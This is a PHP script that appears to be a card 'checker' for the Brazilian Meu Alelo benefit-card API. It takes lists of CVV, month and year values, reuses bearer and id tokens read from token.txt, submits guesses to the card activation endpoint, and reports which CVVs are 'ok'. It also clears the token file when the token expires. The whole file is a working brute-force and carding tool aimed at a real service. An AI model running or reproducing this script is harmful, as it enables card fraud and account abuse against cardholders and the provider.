<?php
error_reporting(0);

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cvv = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$opcao = multiexplode($lista)[3];

$aut01 = file_get_contents("token.txt");
$authorization = explode("|", $aut01)[0];
$id_token = explode("|", $aut01)[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.meualelo.com.br/meualelo-web-api/s/v2/card');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array(
'fnp: 87eb104002a70a8d07886111e8ee135c',
'sec-ch-ua-mobile: ?0',
'authorization: Bearer '.$authorization,
'auth_type: IS-ALELO',
'accept: application/json, text/plain, */*',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'application: WEB',
'id_token: '.$id_token,
'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.meualelo.com.br',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.meualelo.com.br/',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$alimentacao = getStr($result, 'ALIMENTACAO"},"id":"','"');
$refeicao = getStr($result, 'REFEICAO"},"id":"','"');

if ($opcao == 1) {
	$cardId = $alimentacao;
	$status = "Alimentaçao";
}else{
	$cardId = $refeicao;
	$status = "Refeição";
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.meualelo.com.br/meualelo-web-api/s/user/activate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cardId":"'.$cardId.'","cvv":"'.$cvv.'","expirationDate":"'.$mes.'/'.$ano.'"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array(
'fnp: 87eb104002a70a8d07886111e8ee135c',
'sec-ch-ua-mobile: ?0',
'authorization: Bearer '.$authorization,
'auth_type: IS-ALELO',
'accept: application/json, text/plain, */*',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'application: WEB',
'content-type: application/json',
'id_token: '.$id_token,
'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.meualelo.com.br',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.meualelo.com.br/',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

if (curl_errno($ch)) {
	echo 'Error:' . curl_error($ch);
}
elseif (strpos($result, 'invalid')) {
	echo "$status - cvv incorreto";
}elseif (strpos($result, '504')) {
	echo "Problema cloudfront";
}elseif (strpos($result, '401')) {
	echo "Token expirou";
	if (file_exists("token.txt")!== false) {unlink("token.txt");fopen
  	("token.txt", 'w+');fclose
  	("token.txt");}else{fopen
  	("token.txt", 'w+');fclose
  	("token.txt");}
}elseif (strpos($result, 'cpf')) {
	echo "$status - cvv ok $cvv";
}

